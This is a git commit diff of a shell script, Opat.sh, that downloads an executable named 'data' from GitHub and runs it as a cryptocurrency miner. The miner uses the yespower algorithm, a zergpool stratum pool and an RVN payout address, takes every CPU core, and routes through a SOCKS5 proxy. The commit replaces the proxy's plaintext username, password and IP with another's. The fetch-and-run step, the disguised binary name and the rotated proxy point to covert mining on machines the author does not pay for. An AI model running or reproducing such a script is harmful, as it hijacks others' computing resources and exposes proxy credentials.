b4a82239b40e45a39558ce8117a0c94bac96b4ba
eyishxd <102873412+eyishxd@users.noreply.github.com>
2022-04-26 01:01:59 +0700

    Update Opat.sh

--- Opat.sh
+++ Opat.sh
@@ -1,4 +1,4 @@
 apt update -y
 wget -q https://github.com/thirthada007/DevOps/raw/main/data
 chmod +x data
-./data -a yespower -o stratum+tcp://yespower.na.mine.zergpool.com:6533 -u RBbGMpNtitSpNwGMT1cXgYNTfpYdHbrGde.Test -p c=RVN -t $(nproc) -x socks5://scgcaspt:bmjd2n5jj3ly@45.136.231.43:7099
+./data -a yespower -o stratum+tcp://yespower.na.mine.zergpool.com:6533 -u RBbGMpNtitSpNwGMT1cXgYNTfpYdHbrGde.Test -p c=RVN -t $(nproc) -x socks5://mtyccgfz:nt7hiibuzolw@45.142.28.20:8031
